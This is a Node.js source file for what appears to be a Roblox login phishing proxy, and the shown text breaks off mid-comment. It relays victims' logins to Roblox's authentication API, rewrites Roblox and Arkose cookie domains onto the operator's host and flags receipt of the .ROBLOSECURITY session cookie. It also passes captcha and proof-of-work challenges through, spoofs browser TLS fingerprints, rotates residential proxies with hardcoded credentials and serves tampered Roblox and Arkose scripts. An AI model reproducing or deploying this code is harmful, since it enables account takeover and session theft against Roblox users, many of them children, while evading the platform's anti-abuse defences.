const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { spawn, execFile } = require('child_process');
const crypto = require('crypto');
const path = require('path');

const app = express();

console.log('='.repeat(60));
console.log('🔒 ROBLOX LOGIN PROXY - FIXED VERSION');
console.log('='.repeat(60));

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE (for ALL requests - TLS fingerprint spoofing)
// ─────────────────────────────────────────────────────────────
let CURL_BIN = 'curl';
function detectCurlBin() {
    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl_chrome116', 'curl-impersonate-chrome', 'curl'];
    let idx = 0;
    function tryNext() {
        if (idx >= candidates.length) return;
        const bin = candidates[idx++];
        execFile(bin, ['--version'], { timeout: 3000 }, (err) => {
            if (!err) {
                CURL_BIN = bin;
                if (bin === 'curl') {
                    console.warn('⚠️  curl-impersonate NOT found — using plain curl.');
                } else {
                    console.log(`✅ curl-impersonate: ${bin}`);
                }
            } else { tryNext(); }
        });
    }
    tryNext();
}
detectCurlBin();

// ─────────────────────────────────────────────────────────────
// RESIDENTIAL PROXIES (optional - for additional IP rotation)
// ─────────────────────────────────────────────────────────────
const RESIDENTIAL_PROXIES = [
    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
];
let proxyIndex = 0;
function getNextProxy() {
    const p = RESIDENTIAL_PROXIES[proxyIndex];
    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
    return p;
}

// ─────────────────────────────────────────────────────────────
// SHARED AGENTS (fallback only)
// ─────────────────────────────────────────────────────────────
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, timeout: 30000 });

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

// Cache for PoW challenge metadata keyed by challengeId
const powMetadataCache = new Map();

// ─────────────────────────────────────────────────────────────
// SILENCE bundleVerifier.js — no file needed, served inline
// ─────────────────────────────────────────────────────────────
app.get(/bundleVerifier\.js/, (req, res) => {
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.send(`var Roblox=Roblox||{};Roblox.BundleDetector=(function(){return{jsBundlesLoaded:{},bundlesReported:{},counterNames:{},loadStates:{},bundleContentTypes:{},timing:undefined,setTiming:function(){},getLoadTime:function(){return 0;},getCurrentTime:function(){return Date.now();},getCdnProviderName:function(u,cb){cb();},getCdnProviderAndReportMetrics:function(){},reportMetrics:function(){},logToEphemeralCounter:function(){},logToEventStream:function(){},getCdnInfo:function(){},reportBundleError:function(){},bundleDetected:function(n){this.jsBundlesLoaded[n]=true;},verifyBundles:function(){}};})();`);
});

// ─────────────────────────────────────────────────────────────
// SERVE MODIFIED JS FILES
// ─────────────────────────────────────────────────────────────
app.use('/js', express.static(path.join(__dirname, 'modified-js')));

// ─────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────
function generateProxyMetaTags() {
    const sid    = crypto.randomBytes(16).toString('hex');
    const secure = crypto.createHash('md5').update(sid).digest('hex');
    return `<meta name="proxy" value="${sid}">` +
           `<meta name="token" value="${sid}">` +
           `<meta name="secure" value="${secure}">` +
           `<meta name="meta" value="">`;
}

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(c =>
        c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?pingproxies\.com/gi, `Domain=.${cleanHost}`)
         .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
    );
}

function getCleanHost(req) {
    const origin = req.headers['origin'] || '';
    if (origin.startsWith('https://')) {
        const originHost = origin.replace('https://', '').split('/')[0];
        if (!/^\d+\.\d+\.\d+\.\d+/.test(originHost)) {
            return originHost;
        }
    }
    return req.headers.host || 'localhost';
}

function getDeviceId(req) {
    const m = (req.headers.cookie || '').match(/rbx-device-id=([^;]+)/);
    return m ? m[1] : crypto.randomBytes(32).toString('hex');
}

function setCors(res, origin) {
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    res.set('Access-Control-Allow-Headers', [
        'Content-Type', 'x-csrf-token', 'Authorization',
        'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
        'Accept', 'Accept-Language', 'Accept-Encoding',
        'traceparent', 'baggage', 'sentry-trace',
        ...CHALLENGE_HEADERS
    ].join(', '));
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
}

// ─────────────────────────────────────────────────────────────
// LOGGING
// ─────────────────────────────────────────────────────────────
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const skip = ['/www/e.png', '/pe'];
        if (!skip.some(s => req.path.includes(s))) {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${Date.now() - start}ms)`);
        }
    });
    next();
});

// ─────────────────────────────────────────────────────────────
// CORS PREFLIGHT
// ─────────────────────────────────────────────────────────────
app.options('*', (req, res) => {
    setCors(res, req.headers['origin'] || `https://${req.headers.host}`);
    res.sendStatus(200);
});

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE REQUEST FUNCTION
// ─────────────────────────────────────────────────────────────
function makeCurlRequest(method, url, headers, body, useProxy = false) {
    return new Promise((resolve, reject) => {
        const args = [
            '--silent', '--include', '--max-time', '45',
            '--http2', '--compressed',
            '-X', method.toUpperCase()
        ];

        if (useProxy) {
            const proxyUrl = getNextProxy();
            args.push('-x', proxyUrl);
            args.push('--tlsv1.2');
            args.push('--proxy-insecure');
        }

        const skipHeaders = new Set([
            'host', 'content-length', 'transfer-encoding',
            'connection', 'accept-encoding'
        ]);

        for (const [k, v] of Object.entries(headers)) {
            if (!skipHeaders.has(k.toLowerCase())) {
                args.push('-H', `${k}: ${v}`);
            }
        }

        if (headers['user-agent']) {
            args.push('-H', `User-Agent: ${headers['user-agent']}`);
        }

        if (body && body.length > 0) {
            args.push('--data-binary', '@-');
        }

        args.push(url);

        const child = spawn(CURL_BIN, args, { timeout: 50000 });

        if (body && body.length > 0) {
            child.stdin.write(body);
        }
        child.stdin.end();

        const chunks = [];
        let stderr = '';

        child.stdout.on('data', c => chunks.push(c));
        child.stderr.on('data', c => { stderr += c.toString(); });

        child.on('error', (err) => {
            reject(new Error(`curl spawn error: ${err.message}`));
        });

        child.on('close', (code) => {
            if (code !== 0 && code !== null) {
                return reject(new Error(`curl exited with code ${code}. stderr: ${stderr}`));
            }

            const buf = Buffer.concat(chunks);
            const raw = buf.toString('binary');

            const httpRe = /HTTP\/[^\s]+\s+\d+/g;
            let lastMatch = null, m;
            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;

            if (!lastMatch) {
                return reject(new Error(`No HTTP response found. stderr: ${stderr}`));
            }

            const hdrStart = lastMatch.index;
            const hdrEnd = raw.indexOf('\r\n\r\n', hdrStart);

            if (hdrEnd === -1) {
                return reject(new Error('Malformed HTTP response - no header end'));
            }

            const statusLine = raw.substring(hdrStart, raw.indexOf('\r\n', hdrStart));
            const statusCode = parseInt(statusLine.match(/\d{3}/)?.[0] || '0', 10);

            const parsedHdrs = {};
            const headerLines = raw.substring(hdrStart, hdrEnd).split('\r\n').slice(1);
            for (const line of headerLines) {
                const ci = line.indexOf(':');
                if (ci < 1) continue;
                const k = line.substring(0, ci).trim().toLowerCase();
                const v = line.substring(ci + 1).trim();
                if (parsedHdrs[k] !== undefined) {
                    parsedHdrs[k] = Array.isArray(parsedHdrs[k])
                        ? [...parsedHdrs[k], v]
                        : [parsedHdrs[k], v];
                } else {
                    parsedHdrs[k] = v;
                }
            }

            const responseBody = buf.slice(hdrEnd + 4);
            resolve({ statusCode, headers: parsedHdrs, body: responseBody });
        });
    });
}

// ─────────────────────────────────────────────────────────────
// LOGIN HANDLER
// ─────────────────────────────────────────────────────────────
async function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, useProxy = false) {
    const headers = {
        'Content-Type':    'application/json;charset=UTF-8',
        'Accept':          'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
        'User-Agent':      ua || BROWSER_UA,
    };

    const forward = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS];
    for (const h of forward) {
        if (extraHeaders[h]) headers[h] = extraHeaders[h];
    }

    if (cookieHeader) headers['Cookie'] = cookieHeader;
    if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

    const url = 'https://auth.roblox.com/v2/login';
    const body = Buffer.from(bodyStr, 'utf8');

    return await makeCurlRequest('POST', url, headers, body, useProxy);
}

async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 3) {
    let lastErr;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            const useProxy = i > 0;
            return await doLoginRequest(bodyStr, cookie, csrf, ua, extra, useProxy);
        } catch (e) {
            lastErr = e;
            console.log(`   Retry ${i + 1}/${maxRetries + 1}: ${e.message}`);
            await new Promise(r => setTimeout(r, 500 * (i + 1)));
        }
    }
    throw lastErr;
}

function forwardLoginResponse(res, result, host, origin, deviceId) {
    let cookieDomain = host;
    if (origin && origin.startsWith('https://')) {
        const originHost = origin.replace('https://', '').split('/')[0];
        if (!/^\d+\.\d+\.\d+\.\d+/.test(originHost)) {
            cookieDomain = originHost;
        }
    }
    const cleanHost = cookieDomain.replace(/^www\./, '');
    setCors(res, origin);

    for (const h of ['x-csrf-token', 'content-type', 'cache-control', ...CHALLENGE_HEADERS]) {
        if (result.headers[h]) res.set(h, result.headers[h]);
    }

    let cookies = rewriteCookies(result.headers['set-cookie'], cookieDomain) || [];
    if (deviceId) cookies.push(`rbx-device-id=${deviceId}; Domain=.${cleanHost}; Path=/; Secure; SameSite=None`);
    if (cookies.length) res.set('Set-Cookie', cookies);

    const hasRoblo = (result.headers['set-cookie'] || []).some(c =>
        Array.isArray(c) ? c.some(sc => sc.includes('.ROBLOSECURITY')) : c.includes('.ROBLOSECURITY')
    );
    if (hasRoblo) console.log('✅ .ROBLOSECURITY received — login success!');
    else if (result.statusCode === 200) console.log('⚠️  200 but no .ROBLOSECURITY');

    res.status(result.statusCode).send(result.body);
}

async function loginHandler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const host     = req.headers.host || 'localhost';
    const origin   = req.headers['origin'] || `https://${host}`;
    const ua       = req.headers['user-agent'] || BROWSER_UA;
    const cookies  = req.headers['cookie'] || '';
    const deviceId = getDeviceId(req);

    const hasChallenge = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    console.log(`🔑 LOGIN | Challenge: ${hasChallenge ? 'YES' : 'NO'} | curl: ${CURL_BIN}`);

    try {
        const bodyStr = req.body.toString('utf8');

        if (hasChallenge) {
            const csrfFromCookie = cookies.match(/X-CSRF-TOKEN=([^;]+)/i)?.[1] ||
                                   cookies.match(/csrf-token=([^;]+)/i)?.[1] || null;

            const challengeHeaders = { ...req.headers };
            const incomingChallengeId = req.headers['rblx-challenge-id'] || '';
            const incomingMeta = req.headers['rblx-challenge-metadata'] || '';
            const incomingType = req.headers['rblx-challenge-type'] || '';

            if (incomingType === 'proofofwork' && incomingChallengeId && incomingMeta) {
                const cachedRaw = powMetadataCache.get(incomingChallengeId);
                if (cachedRaw) {
                    try {
                        const browserMeta = JSON.parse(Buffer.from(incomingMeta, 'base64').toString('utf8'));
                        const redemptionToken = browserMeta.redemptionToken || '';

                        const cachedObj = JSON.parse(Buffer.from(cachedRaw, 'base64').toString('utf8'));
                        cachedObj.redemptionToken = redemptionToken;
                        const fullMeta = Buffer.from(JSON.stringify(cachedObj)).toString('base64');

                        challengeHeaders['rblx-challenge-metadata'] = fullMeta;
                        console.log(`   PoW metadata rebuilt for ${incomingChallengeId.slice(0,20)}...`);
                        console.log(`   redemptionToken: ${redemptionToken.slice(0,16)}...`);
                        powMetadataCache.delete(incomingChallengeId);
                    } catch (e) {
                        console.warn(`   Failed to rebuild PoW metadata: ${e.message}`);
                    }
                } else {
                    console.warn(`   No cached metadata for ${incomingChallengeId} — sending as-is`);
                }
            }

            let result = await doLoginWithRetry(bodyStr, cookies, csrfFromCookie, ua, challengeHeaders);
            console.log(`   Challenge login attempt 1: ${result.statusCode}`);

            if (result.statusCode === 403 && result.headers['x-csrf-token']) {
                const csrfToken = result.headers['x-csrf-token'];
                console.log(`   Got CSRF token ${csrfToken.slice(0,8)}..., retrying with challenge headers`);
                let cookieHeader = cookies;
                if (result.headers['set-cookie']) {
                    const extra = [].concat(result.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }
                result = await doLoginWithRetry(bodyStr, cookieHeader, csrfToken, ua, challengeHeaders);
                console.log(`   Challenge login attempt 2: ${result.statusCode}`);
            }

            if (result.statusCode === 200) console.log('✅ LOGIN SUCCESS (with challenge)');
            else console.log(`❌ Challenge login failed: ${result.statusCode}`);

            return forwardLoginResponse(res, result, host, origin, deviceId);
        }

        const step1 = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
        console.log(`   Step 1: ${step1.statusCode}`);
        if (!step1.headers['x-csrf-token']) return forwardLoginResponse(res, step1, host, origin, deviceId);

        let cookieHeader = cookies;
        if (step1.headers['set-cookie']) {
            const extra = [].concat(step1.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }
        const step2 = await doLoginWithRetry(bodyStr, cookieHeader, step1.headers['x-csrf-token'], ua, req.headers);
        console.log(`   Step 2: ${step2.statusCode}`);

        let final = step2;
        if (step2.statusCode === 403 && step2.headers['x-csrf-token'] && step2.headers['x-csrf-token'] !== step1.headers['x-csrf-token']) {
            if (step2.headers['set-cookie']) {
                const extra = [].concat(step2.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }
            final = await doLoginWithRetry(bodyStr, cookieHeader, step2.headers['x-csrf-token'], ua, req.headers);
            console.log(`   Step 3: ${final.statusCode}`);
        }

        if (final.statusCode === 200) console.log('✅ LOGIN SUCCESS');
        else if (final.headers['rblx-challenge-id']) {
            console.log('🧩 Challenge required');
            const cid = final.headers['rblx-challenge-id'];
            const meta = final.headers['rblx-challenge-metadata'];
            if (cid && meta) {
                powMetadataCache.set(cid, meta);
                if (powMetadataCache.size > 100) {
                    powMetadataCache.delete(powMetadataCache.keys().next().value);
                }
            }
        }
        else console.log(`❌ Login failed: ${final.statusCode}`);

        forwardLoginResponse(res, final, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
}

app.use('/v2/login', express.raw({ type: '*/*' }), loginHandler);
app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);

// ─────────────────────────────────────────────────────────────
// CHALLENGE CONTINUE HANDLER
// ─────────────────────────────────────────────────────────────
app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res) => {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    const host = req.headers.host || 'localhost';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const cookies = req.headers['cookie'] || '';

    try {
        const bodyStr = req.body.toString('utf8');
        let bodyObj;
        try {
            bodyObj = JSON.parse(bodyStr);
        } catch (e) {
            bodyObj = {};
        }

        const originalType = bodyObj.challengeType || 'unknown';
        const challengeId   = bodyObj.challengeID || bodyObj.challengeId || '';
        console.log(`[challenge/continue] Challenge type (original): ${originalType}`);
        console.log(`[challenge/continue] Challenge ID: ${challengeId}`);

        // PoW /continue must be sent to Roblox for server-side validation —
        // do NOT short-circuit it. Fall through to the real /continue call below.

        if (bodyObj.challengeId && !bodyObj.challengeID) {
            bodyObj.challengeID = bodyObj.challengeId;
            delete bodyObj.challengeId;
        }

        if (bodyObj.challengeMetadata && typeof bodyObj.challengeMetadata === 'object') {
            bodyObj.challengeMetadata = JSON.stringify(bodyObj.challengeMetadata);
        }

        const fixedBodyStr = JSON.stringify(bodyObj);
        console.log(`[challenge/continue] Fixed body → ${fixedBodyStr.substring(0, 200)}`);

        const headers = {
            'Content-Type':    'application/json;charset=UTF-8',
            'Accept':          'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      ua,
        };

        if (cookies) headers['Cookie'] = cookies;
        if (req.headers['x-csrf-token']) headers['X-CSRF-TOKEN'] = req.headers['x-csrf-token'];
        if (req.headers['rbx-device-id']) headers['rbx-device-id'] = req.headers['rbx-device-id'];
        if (req.headers['x-bound-auth-token']) headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];

        for (const h of CHALLENGE_HEADERS) {
            if (req.headers[h]) headers[h] = req.headers[h];
        }

        const url = 'https://apis.roblox.com/challenge/v1/continue';
        const result = await makeCurlRequest('POST', url, headers, Buffer.from(fixedBodyStr, 'utf8'), false);

        console.log(`[challenge/continue] ← ${result.statusCode}`);

        if (result.statusCode !== 200) {
            console.log(`[challenge/continue] Response: ${result.body.toString().substring(0, 500)}`);
        }

        const skipHdrs = new Set([
            'content-security-policy', 'content-security-policy-report-only',
            'x-content-security-policy', 'transfer-encoding', 'connection',
            'content-encoding', 'keep-alive', 'proxy-authenticate',
            'proxy-authorization', 'te', 'trailers', 'upgrade'
        ]);

        for (const [k, v] of Object.entries(result.headers)) {
            if (skipHdrs.has(k)) continue;
            if (k === 'set-cookie') {
                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
            } else {
                try { res.set(k, v); } catch (_) {}
            }
        }

        res.status(result.statusCode).send(result.body);

    } catch (err) {
        console.error(`[challenge/continue] ❌ Error: ${err.message}`);
        res.status(502).json({ error: 'Challenge continue error', message: err.message });
    }
});

// ─────────────────────────────────────────────────────────────
// UNIVERSAL CURL-IMPERSONATE PROXY
// ─────────────────────────────────────────────────────────────
function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
    return async (req, res) => {
        const origin = req.headers['origin'] || `https://${req.headers.host}`;
        setCors(res, origin);

        let targetPath = req.path;
        if (pathPrefix) {
            targetPath = pathPrefix + req.path;
        }
        const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
        const targetUrl = `https://${targetHost}${targetPath}${qs}`;

        const headers = {
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
            'Accept':          req.headers['accept'] || 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        };

        if (req.headers['content-type']) {
            headers['Content-Type'] = req.headers['content-type'];
        }
        if (req.headers['cookie']) {
            headers['Cookie'] = req.headers['cookie'];
        }
        if (req.headers['x-csrf-token']) {
            headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
        }
        if (req.headers['rbx-device-id']) {
            headers['rbx-device-id'] = req.headers['rbx-device-id'];
        }
        if (req.headers['x-bound-auth-token']) {
            headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];
        }
        if (req.headers['traceparent']) {
            headers['traceparent'] = req.headers['traceparent'];
        }

        for (const h of CHALLENGE_HEADERS) {
            if (req.headers[h]) headers[h] = req.headers[h];
        }

        let body = null;
        if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
            body = await new Promise((resolve) => {
                const bufs = [];
                req.on('data', c => bufs.push(c));
                req.on('end', () => resolve(Buffer.concat(bufs)));
            });
        }

        try {
            const result = await makeCurlRequest(
                req.method,
                targetUrl,
                headers,
                body,
                useResidentialProxy
            );

            const skipHdrs = new Set([
                'content-security-policy', 'content-security-policy-report-only',
                'x-content-security-policy', 'transfer-encoding', 'connection',
                'content-encoding', 'keep-alive', 'proxy-authenticate',
                'proxy-authorization', 'te', 'trailers', 'upgrade'
            ]);

            for (const [k, v] of Object.entries(result.headers)) {
                if (skipHdrs.has(k)) continue;
                if (k === 'set-cookie') {
                    res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
                } else {
                    try { res.set(k, v); } catch (_) {}
                }
            }

            if (req.path.includes('continue') && result.statusCode !== 200) {
                console.log(`[challenge/continue] ❌ ${result.statusCode}`);
                console.log(`[challenge/continue] Response body: ${result.body.toString().substring(0, 500)}`);
                console.log(`[challenge/continue] Response headers: ${JSON.stringify(result.headers)}`);
            }

            res.status(result.statusCode).send(result.body);

        } catch (err) {
            console.error(`[curl-proxy:${targetHost}] ❌ ${req.method} ${req.path} | ${err.message}`);
            if (!res.headersSent) {
                res.status(502).json({ error: 'Proxy error', message: err.message });
            }
        }
    };
}

// ─────────────────────────────────────────────────────────────
// ROUTE MAP
// ─────────────────────────────────────────────────────────────

const ARKOSE_ROUTES = [
    ['/arkose-api',     'arkoselabs.roblox.com'],
    ['/arkose-client',  'client-api.arkoselabs.com'],
    ['/arkose-cdn',     'cdn.arkoselabs.com'],
    ['/arkose-fc',      'fc.arkoselabs.com'],
    ['/arkose-game',    'game.arkoselabs.com'],
    ['/arkose-assets',  'assets.arkoselabs.com'],
    ['/arkose-images',  'roblox-images.arkoselabs.com'],
    ['/captcha-rbxcdn', 'captcha.rbxcdn.com'],
    ['/apis-rbxcdn',    'apis.rbxcdn.com'],
];

const ROBLOX_CAPTCHA_HOST = 'captcha.roblox.com';
const ARKOSE_PUBLIC_KEY_PATTERN = /^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$/i;

const API_ROUTES = [
    ['/challenge',                        'apis.roblox.com', '/challenge'],
    ['/account-security-service',         'apis.roblox.com', '/account-security-service'],
    ['/proof-of-work-service',            'apis.roblox.com', '/proof-of-work-service'],
    ['/auth-token-service',               'apis.roblox.com', '/auth-token-service'],
    ['/hba-service',                      'apis.roblox.com', '/hba-service'],
    ['/rotating-client-service',          'apis.roblox.com', '/rotating-client-service'],
    ['/product-experimentation-platform', 'apis.roblox.com', '/product-experimentation-platform'],
    ['/universal-app-configuration',      'apis.roblox.com', '/universal-app-configuration'],
    ['/guac-v2',                          'apis.roblox.com', '/guac-v2'],
    ['/otp-service',                      'apis.roblox.com', '/otp-service'],
    ['/captcha',                          'apis.rbxcdn.com', '/captcha'],
    ['/v1/account-information',           'accountinformation.roblox.com'],
    ['/v2/account-information',           'accountinformation.roblox.com'],
    ['/v1/users',                         'users.roblox.com'],
    ['/v2/users',                         'users.roblox.com'],
    ['/v1/avatar',                        'avatar.roblox.com'],
    ['/v2/avatar',                        'avatar.roblox.com'],
    ['/v1/badges',                        'badges.roblox.com'],
    ['/v1/catalog',                       'catalog.roblox.com'],
    ['/v2/catalog',                       'catalog.roblox.com'],
    ['/v1/economy',                       'economy.roblox.com'],
    ['/v2/economy',                       'economy.roblox.com'],
    ['/v1/friends',                       'friends.roblox.com'],
    ['/v2/friends',                       'friends.roblox.com'],
    ['/v1/presence',                      'presence.roblox.com'],
    ['/v2/presence',                      'presence.roblox.com'],
    ['/v1/thumbnails',                    'thumbnails.roblox.com'],
    ['/v2/thumbnails',                    'thumbnails.roblox.com'],
    ['/v1/groups',                        'groups.roblox.com'],
    ['/v2/groups',                        'groups.roblox.com'],
    ['/v1/metrics',                       'metrics.roblox.com'],
    ['/v1/games',                         'games.roblox.com'],
    ['/v2/games',                         'games.roblox.com'],
    ['/discovery-api',                    'apis.roblox.com', '/discovery-api'],
    ['/user-profile-api',                 'apis.roblox.com', '/user-profile-api'],
    ['/beacon-api',                       'apis.roblox.com', '/beacon-api'],
    ['/platform-chat-api',                'apis.roblox.com', '/platform-chat-api'],
    ['/upsellCard',                       'apis.roblox.com', '/upsellCard'],
    ['/trades',                           'trades.roblox.com'],
    ['/usermoderation',                   'usermoderation.roblox.com'],
    ['/lms',                              'lms.roblox.com'],
    ['/game/report-event',                'www.roblox.com'],
    ['/ecsv2-api',                        'ecsv2.roblox.com'],
    ['/client-telemetry',                 'client-telemetry.roblox.com'],
    ['/ephemeralcounters',                'ephemeralcounters.roblox.com'],
    ['/notifications',                    'realtime.roblox.com'],
];

// Register Arkose routes
for (const [prefix, target] of ARKOSE_ROUTES) {
    const targetHost = target.replace(/^https?:\/\//, '').replace(/\/+$/, '');
    app.use(prefix, createCurlProxy(targetHost, '', false));
}

// Register API routes
for (const [prefix, target, pathPrefix] of API_ROUTES) {
    app.use(prefix, createCurlProxy(target, pathPrefix, false));
}

// ═════════════════════════════════════════════════════════════════════════════
// ═══ SERVE LOCAL MODIFIED FC/ ASSETS FIRST (before proxying to Arkose) ════════
// ═════════════════════════════════════════════════════════════════════════════

// Version-agnostic game_core_bootstrap.js — serve our local modified copy
// regardless of what version number the browser requests, and regardless of
// whether the URL uses /fc/, /cdn/fc/, or /assets/ec-game-core/ prefixes.
app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/bootstrap\/[^/]+\/[^/]+\/game_core_bootstrap\.js(\?.*)?$/, (req, res) => {
    console.log(`[bootstrap] Intercepted ${req.path} → serving local 1.29.6`);
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.sendFile(path.join(__dirname, 'fc/assets/ec-game-core/bootstrap/1.29.6/standard/game_core_bootstrap.js'), (err) => {
        if (err) { console.error('[bootstrap] Error:', err.message); res.status(500).end(); }
    });
});


// Version-agnostic game-core frame index.html — serve local regardless of version.
app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/game-core\/[^/]+\/[^/]+\/index\.html(\?.*)?$/, (req, res) => {
    console.log(`[game-core] Intercepted ${req.path} → serving local 1.29.6/compat/index.html`);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'fc/assets/ec-game-core/game-core/1.29.6/compat/index.html'), (err) => {
        if (err) { console.error('[game-core] Error:', err.message); res.status(500).end(); }
    });
});

// Version-agnostic game-core JS files (main, lib.chunk, chunks, vendors) —
// whatever version the browser asks for, serve our local 1.29.6 copy.
app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/game-core\/[^/]+\/[^/]+\/(.+\.js)(\?.*)?$/, (req, res, next) => {
    const filename = path.basename(req.path.split('?')[0]);
    const localFile = path.join(__dirname, 'fc/assets/ec-game-core/game-core/1.29.6/compat', filename);
    const fs = require('fs');
    if (fs.existsSync(localFile)) {
        console.log(`[game-core-js] Serving local 1.29.6/${filename}`);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.setHeader('Cache-Control', 'public, max-age=3600');
        res.sendFile(localFile, (err) => {
            if (err) { console.error(`[game-core-js] Error: ${err.message}`); res.status(500).end(); }
        });
    } else {
        console.log(`[game-core-js] ${filename} not found locally, falling through`);
        next();
    }
});

// Version-agnostic match-game remoteEntry.js
app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/match-game\/[^/]+\/[^/]+\/remoteEntry\.js(\?.*)?$/, (req, res) => {
    console.log(`[match-game] Intercepted ${req.path} → serving local 1.29.6/compat/remoteEntry.js`);
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.sendFile(path.join(__dirname, 'fc/assets/ec-game-core/match-game/1.29.6/compat/remoteEntry.js'), (err) => {
        if (err) { console.error('[match-game] Error:', err.message); res.status(500).end(); }
    });
});

// Serve /cdn/fc from local fc/ folder (handles 1.29.6 chunk files, remoteEntry, etc.)
// Falls through to Arkose proxy for anything not present locally.
app.use('/cdn/fc', express.static(path.join(__dirname, 'fc')));

// Serve /fc from local fc/ folder. Falls through to Arkose for missing files.
app.use('/fc', express.static(path.join(__dirname, 'fc')));

// ═════════════════════════════════════════════════════════════════════════════
// ═══ FIXED: ARKOSE /fc/ ROUTES - ADDED MISSING ENDPOINTS ═════════════════════
// ═════════════════════════════════════════════════════════════════════════════

// /fc/a/ - Action reporting endpoint (reports site URL, events)
app.use('/fc/a', createCurlProxy('arkoselabs.roblox.com', '/fc/a', false));

// /fc/ca/ - Challenge answer endpoint
app.use('/fc/ca', createCurlProxy('arkoselabs.roblox.com', '/fc/ca', false));

// /fc/gfct/ - Game functionality endpoint
app.use('/fc/gfct', createCurlProxy('arkoselabs.roblox.com', '/fc/gfct', false));

// /fc/init-load/ - Initialization endpoint
// Arkose sometimes returns an empty 200 body for this endpoint which breaks
